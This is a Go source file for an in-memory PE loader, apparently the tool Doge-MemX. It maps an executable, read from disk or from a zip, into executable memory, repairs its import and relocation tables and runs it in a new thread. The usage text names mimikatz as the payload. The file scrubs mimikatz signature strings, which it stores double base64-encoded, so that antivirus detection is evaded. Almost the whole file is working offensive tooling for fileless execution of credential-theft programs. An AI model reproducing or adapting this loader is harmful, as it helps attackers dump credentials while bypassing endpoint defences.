package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"github.com/Binject/debug/pe"
	"github.com/timwhitez/Doge-MemX/args"
	"github.com/timwhitez/Doge-MemX/lib"
)

var Argsfunc []args.ArgsFunc
var SysArgs []string

//fix ImportAddressTable
func fixImportAddressTable(baseAddress uintptr){
	fmt.Println("[+] IAT Fix starts...")

	ntHeader := lib.NtH(baseAddress)
	iatDirectory := &ntHeader.OptionalHeader.DataDirectory[lib.IMAGE_DIRECTORY_ENTRY_IMPORT]

	if iatDirectory.VirtualAddress ==0 {
		fmt.Println("[!] Import Table not found")
		return
	}
	iatSize := iatDirectory.Size
	iatRVA := iatDirectory.VirtualAddress

	var ITEntryCursor *lib.IMAGE_IMPORT_DESCRIPTOR = nil
	parsedSize := uintptr(0)

	for ;parsedSize<uintptr(iatSize);parsedSize+=unsafe.Sizeof(lib.IMAGE_IMPORT_DESCRIPTOR{}) {
		ITEntryCursor = (*lib.IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(uintptr(iatRVA)+uintptr(baseAddress)+parsedSize))
		if ITEntryCursor.OriginalFirstThunk == 0 && ITEntryCursor.FirstThunk == 0{
			break
		}

		ptrLibraryName := unsafe.Pointer(uintptr(baseAddress)+uintptr(ITEntryCursor.Name))
		libraryName := lib.CstrVal(unsafe.Pointer(ptrLibraryName))
		dllName := string(libraryName[:])

		fmt.Println("[+] Imported DLL Name: "+dllName)

		//Address
		firstThunkRVA := ITEntryCursor.FirstThunk
		//Name
		originalFirstThunkRVA := ITEntryCursor.OriginalFirstThunk
		if originalFirstThunkRVA == 0 {
			originalFirstThunkRVA = ITEntryCursor.FirstThunk
		}
		cursorFirstThunk := uintptr(0)
		cursorOriginalFirstThunk := uintptr(0)
		for {
			firstThunkData := (*lib.ImageThunkData)(unsafe.Pointer(baseAddress+cursorFirstThunk+uintptr(firstThunkRVA)))
			originalFirstThunkData := (*lib.OriginalImageThunkData)(unsafe.Pointer(baseAddress+ cursorOriginalFirstThunk +uintptr(originalFirstThunkRVA)))

			//from reflect-pe
			if firstThunkData.AddressOfData == 0{
				//end of the list
				break
			}
			var ptrName unsafe.Pointer
			var funcName string
			if lib.IsMSBSet(originalFirstThunkData.Ordinal) {
				ptrName, funcName = lib.ParseOrdinal(originalFirstThunkData.Ordinal)
				//fmt.Println("[+] Import by ordinal: " + funcName)

			} else {
				ptrName, funcName = lib.ParseFuncAddress(baseAddress, firstThunkData.AddressOfData)
				//fmt.Println(" [+] Import by name: "+funcName)

			}
			dllAddr,_ := syscall.LoadLibrary(dllName)
			functionAddr , err := lib.GetProcAddress(unsafe.Pointer(dllAddr), ptrName)
			if err != nil {
				return
			}


			//arguments functions
			if lib.Contains(args.Argfunc,funcName){
				fmt.Println("get Args func: "+ funcName)
				tmpfunc := args.ArgsFunc{
					Name: funcName,
					Address: functionAddr,
				}
				Argsfunc = append(Argsfunc,tmpfunc)
			}

			firstThunkData.AddressOfData = functionAddr
			//firstThunkData->u1.Function = (ULONGLONG)functionAddr;

			cursorFirstThunk += unsafe.Sizeof(lib.ImageThunkData{})
			cursorOriginalFirstThunk += unsafe.Sizeof(lib.ImageThunkData{})
		}
	}
}


//fix relocTable
func fixRelocTable(loadedAddr uintptr, perferableAddr uintptr, relocDir *lib.IMAGE_DATA_DIRECTORY){
	maxSizeOfDir := relocDir.Size
	relocBlocks := relocDir.VirtualAddress
	var relocBlockMetadata *lib.IMAGE_BASE_RELOCATION

	relocBlockOffset := uintptr(0)
	for ; relocBlockOffset < uintptr(maxSizeOfDir); relocBlockOffset += uintptr(relocBlockMetadata.SizeOfBlock){
		relocBlockMetadata = (*lib.IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(relocBlocks)+relocBlockOffset+loadedAddr))
		if relocBlockMetadata.VirtualAddress == 0 || relocBlockMetadata.SizeOfBlock == 0{
			break
		}
		entriesNum := (uintptr(relocBlockMetadata.SizeOfBlock) - unsafe.Sizeof(lib.IMAGE_BASE_RELOCATION{})) / unsafe.Sizeof(lib.ImageReloc{})
		pageStart := relocBlockMetadata.VirtualAddress
		relocEntryCursor := (*lib.ImageReloc)(unsafe.Pointer(uintptr(unsafe.Pointer(relocBlockMetadata))+unsafe.Sizeof(lib.IMAGE_BASE_RELOCATION{})))

		for i := 0; i<int(entriesNum);i++{
			if relocEntryCursor.GetType() == 0{
				continue
			}

			relocationAddr := uintptr(pageStart) + uintptr(loadedAddr)+uintptr(relocEntryCursor.GetOffset())
			relocationAddr = uintptr((unsafe.Pointer(relocationAddr))) + loadedAddr - perferableAddr
			relocEntryCursor = (*lib.ImageReloc)(unsafe.Pointer(uintptr(unsafe.Pointer(relocEntryCursor))+unsafe.Sizeof(lib.ImageReloc{})))
		}

	}
	if relocBlockOffset == 0{
		fmt.Println("[!] There is a problem in relocation directory")
	}
}


// CopySections - writes the sections of a PE image to the given base address in memory
func CopySections(pefile *pe.File, image *[]byte, loc uintptr) error {
	// Copy Headers
	var sizeOfHeaders uint32

	if pefile.Machine == pe.IMAGE_FILE_MACHINE_AMD64 {
		sizeOfHeaders = pefile.OptionalHeader.(*pe.OptionalHeader64).SizeOfHeaders
	} else {
		panic(fmt.Errorf("not support x86 pe\n"))
	}
	hbuf := (*[^uint32(0)]byte)(unsafe.Pointer(uintptr(loc)))
	for index := uint32(0); index < sizeOfHeaders; index++ {
		hbuf[index] = (*image)[index]
	}

	// Copy Sections
	for _, section := range pefile.Sections {
		//fmt.Println("Writing:", fmt.Sprintf("%s %x %x", section.Name, loc, uint32(loc)+section.VirtualAddress))
		if section.Size == 0 {
			continue
		}
		d, err := section.Data()
		if err != nil {
			return err
		}
		dataLen := uint32(len(d))
		dst := uint64(loc) + uint64(section.VirtualAddress)
		buf := (*[^uint32(0)]byte)(unsafe.Pointer(uintptr(dst)))
		for index := uint32(0); index < dataLen; index++ {
			buf[index] = d[index]
		}
	}

	// Write symbol and string tables
	bbuf := bytes.NewBuffer(nil)
	binary.Write(bbuf, binary.LittleEndian, pefile.COFFSymbols)
	binary.Write(bbuf, binary.LittleEndian, pefile.StringTable)
	b := bbuf.Bytes()
	blen := uint32(len(b))
	for index := uint32(0); index < blen; index++ {
		hbuf[index+pefile.FileHeader.PointerToSymbolTable] = b[index]
	}

	return nil
}


func peLoader(bytes0 *[]byte,funcExec string){
	baseAddr := *(*uintptr)(unsafe.Pointer(bytes0))
	tgtFile := lib.NtH(baseAddr)

	peF,_ := pe.NewFile(bytes.NewReader(*bytes0))
	relocTable := lib.GetRelocTable(tgtFile)

	preferableAddress := tgtFile.OptionalHeader.ImageBase

	ntdllHandler,_ := syscall.LoadLibrary("ntdll.dll")
	NtUnmapViewOfSection,_ := syscall.GetProcAddress(ntdllHandler,"NtUnmapViewOfSection")
	syscall.Syscall(NtUnmapViewOfSection,2,uintptr(0xffffffffffffffff),uintptr(tgtFile.OptionalHeader.ImageBase),0)

	imageBaseForPE,_ := windows.VirtualAlloc(uintptr(preferableAddress),uintptr(tgtFile.OptionalHeader.SizeOfImage),0x00001000|0x00002000,windows.PAGE_EXECUTE_READWRITE)

	if imageBaseForPE == 0 && relocTable == nil{
		fmt.Println("[!] No Relocation Table and Cannot load to the preferable address")
		return
	}
	if imageBaseForPE == 0 && relocTable != nil{
		fmt.Println("[+] Cannot load to the preferable address")
		imageBaseForPE,_ = windows.VirtualAlloc(0,uintptr(tgtFile.OptionalHeader.SizeOfImage),0x00001000|0x00002000,windows.PAGE_EXECUTE_READWRITE)

		if imageBaseForPE == 0{
			fmt.Println("[!] Cannot allocate the memory")
			return
		}
	}

	tgtFile.OptionalHeader.ImageBase = (lib.ULONGLONG)(imageBaseForPE)

	//copy headers
	lib.Memcpy(baseAddr,imageBaseForPE,uintptr(tgtFile.OptionalHeader.SizeOfHeaders))

	fmt.Println("[+] All headers are copied")

	//copy section from *pe.File
	CopySections(peF,bytes0,imageBaseForPE)

	fmt.Println("[+] All sections are copied")

	fixImportAddressTable(imageBaseForPE)

	if imageBaseForPE != uintptr(preferableAddress){
		if relocTable != nil{
			fixRelocTable(imageBaseForPE,uintptr(preferableAddress),(*lib.IMAGE_DATA_DIRECTORY)(unsafe.Pointer(relocTable)))
		}else{
			fmt.Println("[!] No Reloc Table Found")
		}
	}
	startAddress := imageBaseForPE+uintptr(tgtFile.OptionalHeader.AddressOfEntryPoint)

	//fix arguments
	for _, function := range Argsfunc {
		if injectorFunc, ok := args.ArgInjectors[function.Name]; ok {
			fmt.Println("Calling args injector for: ", function.Name)
			injectorFunc(function.Address, SysArgs)
		}
	}

	fmt.Println("[+] Binary is running")

	exec(startAddress,funcExec)

	//syscall.Syscall(startAddress,0,0,0,0)
}

func exec(startA uintptr,funcExec string){
	switch funcExec {
	case "syscall":
		fmt.Println("syscall.Syscall")
		syscall.Syscall(startA,0,0,0,0)

	case "createthread":
		createThread := syscall.NewLazyDLL("kernel32").NewProc("CreateThread")
		resumeThread := syscall.NewLazyDLL("kernel32").NewProc("ResumeThread")
		waitForSingleObject := syscall.NewLazyDLL("kernel32").NewProc("WaitForSingleObject")
		fmt.Println("CreateThread...")
		r1, _, err := createThread.Call(
			uintptr(0),
			uintptr(0),
			startA,
			uintptr(0),
			uintptr(0x00000004),
			uintptr(0))
		if err != syscall.Errno(0) {
			syscall.Syscall(startA,0,0,0,0)
		}else{
			fmt.Println("ResumeThread...")
			_, _, err = resumeThread.Call(r1)
			if err != syscall.Errno(0) {
				panic(err)
			}
			fmt.Println("WaitForSingleObject...")
			_, _, err = waitForSingleObject.Call(
				r1,
				syscall.INFINITE)
			if err != syscall.Errno(0) {
				panic(err)
			}
			syscall.CloseHandle(syscall.Handle(r1))
		}

	}


}



func main(){
	var shellcode []byte
	if len(os.Args)!= 2||os.Args[1] == "-h"{
		fmt.Println("Usage:")
		fmt.Println("	Doge-MemX.exe mimikatz.exe\n")
		fmt.Println("	Doge-MemX.exe mimikatz.zip\n")
		os.Exit(1)
	}
	fileObj, err := os.Open(os.Args[1])
	if err != nil{
		panic(err)
	}

	shellcode, err = ioutil.ReadAll(fileObj)
	if err != nil{
		panic(err)
	}

	//支持从zip压缩包读取exe
	if strings.Contains(os.Args[1],".zip"){
		shellcode,err = lib.ReadZipFile(shellcode)
		if err != nil{
			panic(err)
		}
		if shellcode == nil{
			panic(fmt.Errorf("fail to read zip"))
		}
	}

	blacklist := []string{
		//以mimikatz为例，恶意字符串替换
		//warning!! may cause panic!
		/*
		"mimikatz",
		"delpy",
		"benjamin",
		"delpy",
		"vincent",
		"le toux",
		"letoux",
		"A La Vie, A L'Amour",
		"la vie",
		"gentilkiwi",
		"kiwi",
		"creativecommons",
		"oe.eo",
		"pingcastle",
		"mysmartlogon",
		".#####.",
		".## ^ ##.",
		"## / \\ ##",
		"## \\ / ##",
		"'## v ##'",
		"'#####'",
		"This program cannot be run in DOS mode",
		 */
		lib.DecodeB64(lib.DecodeB64("YldsdGFXdGhkSG89")),
		lib.DecodeB64(lib.DecodeB64("WkdWc2NIaz0=")),
		lib.DecodeB64(lib.DecodeB64("WW1WdWFtRnRhVzQ9")),
		lib.DecodeB64(lib.DecodeB64("WkdWc2NIaz0=")),
		lib.DecodeB64(lib.DecodeB64("ZG1sdVkyVnVkQT09")),
		lib.DecodeB64(lib.DecodeB64("YkdVZ2RHOTFlQT09")),
		lib.DecodeB64(lib.DecodeB64("YkdWMGIzVjQ=")),
		lib.DecodeB64(lib.DecodeB64("UVNCTVlTQldhV1VzSUVFZ1RDZEJiVzkxY2c9PQ==")),
		lib.DecodeB64(lib.DecodeB64("YkdFZ2RtbGw=")),
		lib.DecodeB64(lib.DecodeB64("WjJWdWRHbHNhMmwzYVE9PQ==")),
		lib.DecodeB64(lib.DecodeB64("YTJsM2FRPT0=")),
		lib.DecodeB64(lib.DecodeB64("WTNKbFlYUnBkbVZqYjIxdGIyNXo=")),
		lib.DecodeB64(lib.DecodeB64("YjJVdVpXOD0=")),
		lib.DecodeB64(lib.DecodeB64("Y0dsdVoyTmhjM1JzWlE9PQ==")),
		lib.DecodeB64(lib.DecodeB64("YlhsemJXRnlkR3h2WjI5dQ==")),
		lib.DecodeB64(lib.DecodeB64("TGlNakl5TWpMZz09")),
		lib.DecodeB64(lib.DecodeB64("TGlNaklGNGdJeU11")),
		lib.DecodeB64(lib.DecodeB64("SXlNZ0x5QmNJQ01q")),
		lib.DecodeB64(lib.DecodeB64("SXlNZ1hDQXZJQ01q")),
		lib.DecodeB64(lib.DecodeB64("SnlNaklIWWdJeU1u")),
		lib.DecodeB64(lib.DecodeB64("SnlNakl5TWpKdz09")),
		lib.DecodeB64(lib.DecodeB64("VkdocGN5QndjbTluY21GdElHTmhibTV2ZENCaVpTQnlkVzRnYVc0Z1JFOVRJRzF2WkdVPQ==")),
	}
	shellcode = lib.ObfuscateStrings(shellcode,blacklist)

	SysArgs = append(SysArgs, os.Args[0])

	//run args
	tmpArgs := []string{"coffee"}
	for i,_ := range tmpArgs{
		SysArgs = append(SysArgs,tmpArgs[i])
	}

	peLoader(&shellcode,"createthread")
	//peLoader(&shellcode,"syscall")

}
